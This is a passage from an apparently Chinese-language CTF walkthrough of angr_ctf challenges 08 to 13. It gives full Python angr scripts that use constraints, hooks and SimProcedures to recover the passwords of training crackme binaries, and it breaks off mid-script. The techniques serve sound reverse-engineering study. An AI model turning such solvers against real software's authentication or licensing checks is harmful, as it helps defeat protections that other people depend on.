的约束求解功能</p><p>在比较发生前停止，把被比较的数据直接约束为参考值，然后让 SMT 求解器反解出输入 password</p><p>Angr 代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr <br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">argv</span>):<br>    path_to_binary = <span class="hljs-string">&quot;./08_angr_constraints&quot;</span><br>    project = angr.Project(path_to_binary)<br><br>    start_address = <span class="hljs-number">0x08048625</span> <span class="hljs-comment"># scanf 调用之后</span><br>    initial_state = project.factory.blank_state(<br>        addr=start_address,<br>        add_options = &#123; <br>            angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,<br>            angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS<br>        &#125;<br>    )<br><br>    password = claripy.BVS(<span class="hljs-string">&#x27;password&#x27;</span>,<span class="hljs-number">16</span>*<span class="hljs-number">8</span>)<br>    password_address = <span class="hljs-number">0x804a050</span> <span class="hljs-comment"># buffer 地址</span><br>    initial_state.memory.store(password_address,password)<br><br>    simulation = project.factory.simgr(initial_state)<br><br>    address_to_check_constraint = <span class="hljs-number">0x08048669</span> <span class="hljs-comment"># 调用 check 函数前的地址</span><br>    simulation.explore(find=address_to_check_constraint)<br><br>    <span class="hljs-keyword">if</span> simulation.found:<br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br>        constrained_parameter_address = <span class="hljs-number">0x804a050</span><br>        constrained_parameter_size_bytes = <span class="hljs-number">16</span> <span class="hljs-comment"># 16 字节</span><br>        constrained_parameter_bitvector = solution_state.memory.load(<br>            constrained_parameter_address,<br>            constrained_parameter_size_bytes<br>        )<br><br>        constrained_parameter_desired_value = <span class="hljs-string">b&quot;AUPDNNPROEZRJWKB&quot;</span> <span class="hljs-comment"># 目标字符串</span><br>        solution_state.add_constraints(constrained_parameter_bitvector == constrained_parameter_desired_value)<br><br>        solution = solution_state.solver.<span class="hljs-built_in">eval</span>(password, cast_to=<span class="hljs-built_in">bytes</span>)<br>        <span class="hljs-comment"># print(solution)</span><br>        <span class="hljs-built_in">print</span>(solution.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main(sys.argv)<br></code></pre></td></tr></table></figure><p><img src="/../images/angr/08.1.png"></p><h3 id="09-angr-hooks"><a href="#09-angr-hooks" class="headerlink" title="09_angr_hooks"></a>09_angr_hooks</h3><p><img src="/../images/angr/09.png"></p><p><img src="/../images/angr/09.0.png"></p><p>程序读取了两次输入，第一次输入经过 complex_function 之后与目标字符串 password 比较，第二次输入与变换后的 password 比较</p><p>如果用符号执行解决的话，需要关注的依旧是检查函数 <code>check_equals_XYMKBKUHNIQYNQXE</code>，除了上文条件约束的方法，还可以使用 Angr 的 hook 功能<br><code>@project.hook(addr, length=n)</code><br>在执行到 addr 时，调用 Python 函数替代原本的机器码<br>length&#x3D;n 告诉 angr 这段原始机器码占 n 个字节,执行完 hook 后需要跳过这些字节，避免重复执行原指令</p><p>Angr 代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">argv</span>):<br>    path_to_binary = <span class="hljs-string">&quot;./09_angr_hooks&quot;</span><br>    project = angr.Project(path_to_binary)<br><br><br>    initial_state = project.factory.entry_state(<br>        add_options = &#123; angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,<br>                        angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS&#125;<br>    )<br><br>    check_equals_called_address = <span class="hljs-number">0x080486b3</span><br><br>    <span class="hljs-comment"># angr.Hook 中的 length 参数指定了在 hook 执行完之后，执行引擎需要跳过的字节数</span><br>    instruction_to_skip_length = <span class="hljs-number">5</span><br><span class="hljs-meta">    @project.hook(<span class="hljs-params">check_equals_called_address, length=instruction_to_skip_length</span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">skip_check_equals_</span>(<span class="hljs-params">state</span>):<br>        user_input_buffer_address = <span class="hljs-number">0x804a054</span><br>        user_input_buffer_length = <span class="hljs-number">16</span><br><br>        user_input_string = state.memory.load(<br>            user_input_buffer_address, <br>            user_input_buffer_length<br>        )<br><br>        check_against_string = <span class="hljs-string">b&quot;XYMKBKUHNIQYNQXE&quot;</span><br>        <br>        <span class="hljs-comment"># 在 gcc 中，如果返回值是整数类型，会用 eax 来存储返回值</span><br>        <span class="hljs-comment"># 我们需要在 check_against_string == user_input_string 时将 eax 设为 1，否则设为 0</span><br>        <span class="hljs-comment"># 使用 claripy 内置的处理条件表达式的函数</span><br>        state.regs.eax = claripy.If(<br>            user_input_string == check_against_string, <br>            claripy.BVV(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>), <br>            claripy.BVV(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>)<br>            )<br>    <br>    simulation = project.factory.simgr(initial_state)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_successful</span>(<span class="hljs-params">state</span>):<br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">should_abort</span>(<span class="hljs-params">state</span>):<br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output<br>    <br>    simulation.explore(find=is_successful, avoid=should_abort)<br><br>    <span class="hljs-keyword">if</span> simulation.found:<br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br><br>        solution = solution_state.posix.dumps(sys.stdin.fileno()).decode()<br>        <span class="hljs-built_in">print</span>(solution)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Could not find a solution&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main(sys.argv)<br></code></pre></td></tr></table></figure><p><img src="/../images/angr/09.1.png"></p><h3 id="10-angr-simprocedures"><a href="#10-angr-simprocedures" class="headerlink" title="10_angr_simprocedures"></a>10_angr_simprocedures</h3><p><img src="/../images/angr/10.png"></p><p><img src="/../images/angr/10.0.png"></p><p>这个挑战与之前的相似，也是要处理 check 函数，但是通过汇编可以看到，check_equals_ 被调用的次数太多了，如果在每个调用点单独进行 hook，那就不太实际了；而且这道题的输入也是存储在动态的栈地址，</p><p>可以使用 SimProcedure 来编写自己的 check_equals_ 实现，然后 hook check_equals_ 这个符号，从而一次性替换所有对 check_equals_ 的调用</p><p>定义一个继承自 angr.SimProcedure 的类，以便利用 Angr 的 SimProcedure 功能<br>例如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">add_if_positive</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> &#123;<br>  <span class="hljs-keyword">if</span> (a &gt; <span class="hljs-number">0</span> &amp;&amp; b &gt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">return</span> a + b;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个函数可以用下面的方式进行模拟：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ReplacementAddIfPositive</span>(angr.SimProcedure):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, a, b</span>):<br>        <span class="hljs-keyword">if</span> a &gt;= <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> b &gt;=<span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">return</span> a + b<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>        <br></code></pre></td></tr></table></figure><p>Angr 代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">argv</span>):<br>    path_to_binary = <span class="hljs-string">&quot;./10_angr_simprocedures&quot;</span><br>    project = angr.Project(path_to_binary)<br><br><br>    initial_state = project.factory.entry_state(<br>        add_options = &#123; angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,<br>                        angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS&#125;<br>    )<br><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReplacementCheckEquals</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, to_check, length</span>):<br>            <span class="hljs-comment"># 这里不写具体的地址，而是通过参数获取</span><br>            user_input_buffer_address = to_check<br>            user_input_buffer_length = length<br>    <br>            <span class="hljs-comment"># 使用 self.state 来访问 SimProcedure 中程序当前的状态</span><br>            user_input_string = <span class="hljs-variable language_">self</span>.state.memory.load(<br>                user_input_buffer_address, <br>                user_input_buffer_length<br>            )<br><br>            check_against_string = <span class="hljs-string">b&quot;ORSDDWXHZURJRBDH&quot;</span><br>            <span class="hljs-keyword">return</span> claripy.If(<br>                user_input_string == check_against_string, <br>                claripy.BVV(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>), <br>                claripy.BVV(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>)<br>            )<br>        <br><br>    check_equals_symbol = <span class="hljs-string">&quot;check_equals_ORSDDWXHZURJRBDH&quot;</span><br>    project.hook_symbol(check_equals_symbol, ReplacementCheckEquals())<br>    simulation = project.factory.simgr(initial_state)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_successful</span>(<span class="hljs-params">state</span>):<br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">should_abort</span>(<span class="hljs-params">state</span>):<br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output<br>    <br>    simulation.explore(find=is_successful, avoid=should_abort)<br><br>    <span class="hljs-keyword">if</span> simulation.found:<br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br><br>        solution = solution_state.posix.dumps(sys.stdin.fileno()).decode()<br>        <span class="hljs-built_in">print</span>(solution)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Could not find a solution&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main(sys.argv)<br></code></pre></td></tr></table></figure><p><img src="/../images/angr/10.1.png"></p><h3 id="11-angr-sim-scanf"><a href="#11-angr-sim-scanf" class="headerlink" title="11_angr_sim_scanf"></a>11_angr_sim_scanf</h3><p><img src="/../images/angr/11.png"></p><p>这道题的背景是旧版的 Angr 不支持 scanf 读取多个输入，所以 hook 掉 scanf，替换成自己实现的函数<br>但是新版的 Angr 已经支持 scanf 读取多个输入了,用最开始的方法直接符号执行也能成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">argv</span>):<br>    path_to_binary = <span class="hljs-string">&quot;./11_angr_sim_scanf&quot;</span><br>    project = angr.Project(path_to_binary)<br><br>    initial_state = project.factory.entry_state(<br>        add_options = &#123;<br>            angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,<br>            angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS<br>        &#125;<br>    )<br><br>    simulation = project.factory.simgr(initial_state)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_successful</span>(<span class="hljs-params">state</span>):<br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;Good Job.&quot;</span> <span class="hljs-keyword">in</span> stdout_output<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">should_abort</span>(<span class="hljs-params">state</span>):<br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;Try again.&quot;</span> <span class="hljs-keyword">in</span> stdout_output<br><br>    simulation.explore(find=is_successful,avoid=should_abort)<br><br>    <span class="hljs-keyword">if</span> simulation.found:<br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main(sys.argv)<br></code></pre></td></tr></table></figure><p><img src="/../images/angr/11.1.png"></p><p>贴一下 hook scanf 的代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">argv</span>):<br>    path_to_binary = <span class="hljs-string">&quot;./11_angr_sim_scanf&quot;</span><br>    project = angr.Project(path_to_binary)<br><br>    initial_state = project.factory.entry_state()<br><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReplacementScanf</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, format_string, scanf0_address, scanf1_address</span>):<br>            scanf0 = claripy.BVS(<span class="hljs-string">&#x27;scanf0&#x27;</span>, <span class="hljs-number">32</span>)<br>            scanf1 = claripy.BVS(<span class="hljs-string">&#x27;scanf1&#x27;</span>, <span class="hljs-number">32</span>)<br><br>            <span class="hljs-comment"># 存储到指定的内存地址</span><br>            <span class="hljs-variable language_">self</span>.state.memory.store(scanf0_address, scanf0, endness=project.arch.memory_endness)<br>            <span class="hljs-variable language_">self</span>.state.memory.store(scanf1_address, scanf1, endness=project.arch.memory_endness)<br><br>            <span class="hljs-comment"># 保存到 globals 以便后续提取</span><br>            <span class="hljs-variable language_">self</span>.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;solution0&#x27;</span>] = scanf0<br>            <span class="hljs-variable language_">self</span>.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;solution1&#x27;</span>] = scanf1<br>            <br>            <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>  <span class="hljs-comment"># 返回成功读取的参数数量</span><br><br>    <span class="hljs-comment"># Hook scanf符号</span><br>    project.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, ReplacementScanf())<br><br>    simulation = project.factory.simgr(initial_state)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_successful</span>(<span class="hljs-params">state</span>):<br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Good Job.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">should_abort</span>(<span class="hljs-params">state</span>):<br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;Try again.&#x27;</span> <span class="hljs-keyword">in</span> stdout_output<br><br>    simulation.explore(find=is_successful, avoid=should_abort)<br><br>    <span class="hljs-keyword">if</span> simulation.found:<br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br><br>        <span class="hljs-comment"># 从globals中提取解</span><br>        solution0 = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;solution0&#x27;</span>])<br>        solution1 = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;solution1&#x27;</span>])<br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;solution0&#125;</span> <span class="hljs-subst">&#123;solution1&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main(sys.argv)<br><br><span class="hljs-comment"># 1448564819 1398294103</span><br></code></pre></td></tr></table></figure><h3 id="12-angr-veritesting"><a href="#12-angr-veritesting" class="headerlink" title="12_angr_veritesting"></a>12_angr_veritesting</h3><p><img src="/../images/angr/12.png"></p><p>与之前的不同，这道题是对每个输入字符单独混淆并且每次字符立即比较，产生了大量的分支</p><p>使用 Angr 中的一个优化技术 Veritesting 减少符号执行的路径爆炸问题<br><code>simulation = project.factory.simgr(initial_state, veritesting=True)</code></p><p>Veritesting 结合了静态分析和动态分析，当遇到可能导致路径爆炸的代码块时，它暂停盲目的路径分叉，将接下来的一片代码区域当作一个整体进行静态分析和合并，生成统一的路径约束，用条件表达式（如 if-then-else）表示不同路径的结果，从而避免每遇到分支就分裂状态</p><p>Angr 代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">argv</span>):<br>    path_to_binary = <span class="hljs-string">&quot;./12_angr_veritesting&quot;</span><br>    project = angr.Project(path_to_binary)<br><br>    initial_state = project.factory.entry_state(<br>        add_options = &#123;<br>            angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,<br>            angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS<br>        &#125;<br>    )<br>    <br>    <span class="hljs-comment"># 使用 veritesting 来减少路径爆炸</span><br>    simulation = project.factory.simgr(initial_state,veritesting=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">is_successful</span>(<span class="hljs-params">state</span>):<br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;Good Job.&quot;</span> <span class="hljs-keyword">in</span> stdout_output<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">should_abort</span>(<span class="hljs-params">state</span>):<br>        stdout_output = state.posix.dumps(sys.stdout.fileno())<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">b&quot;Try again.&quot;</span> <span class="hljs-keyword">in</span> stdout_output<br><br>    simulation.explore(find=is_successful,avoid=should_abort)<br><br>    <span class="hljs-keyword">if</span> simulation.found:<br>        solution_state = simulation.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main(sys.argv)<br></code></pre></td></tr></table></figure><h3 id="13-angr-static-binary"><a href="#13-angr-static-binary" class="headerlink" title="13_angr_static_binary"></a>13_angr_static_binary</h3><p>对于静态链接的二进制文件，需要手动 hook 这些库函数，把它们替换成 Angr 内置的 SimProcedure，这样就可以跳过库函数内部复杂的执行<br>下面是 angr 已有的一些 SimProcedures，它们实现了标准库函数<br>更多的可以参考 <a href="https://github.com/angr/angr/tree/master/angr/procedures/libc">https://github.com/angr/angr/tree/master/angr/procedures/libc</a><br>angr.SIM_PROCEDURES[‘libc’][‘malloc’]</p><p>angr.SIM_PROCEDURES[‘libc’][‘fopen’]</p><p>angr.SIM_PROCEDURES[‘libc’][‘fclose’]</p><p>angr.SIM_PROCEDURES[‘libc’][‘fwrite’]</p><p>angr.SIM_PROCEDURES[‘libc’][‘getchar’]</p><p>angr.SIM_PROCEDURES[‘libc’][‘strncmp’]</p><p>angr.SIM_PROCEDURES[‘libc’][‘strcmp’]</p><p>angr.SIM_PROCEDURES[‘libc’][‘scanf’]</p><p>angr.SIM_PROCEDURES[‘libc’][‘printf’]</p><p>angr.SIM_PROCEDURES[‘libc’][‘puts’]</p><p>angr.SIM_PROCEDURES[‘libc’][‘exit’]</p><p>angr.SIM_PROCEDURES[‘glibc’][‘__libc_start_main’]</p><p><img src="/../images/angr/13.png"></p><p><img src="/../images/angr/13.0.png"></p><p>Angr 代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span 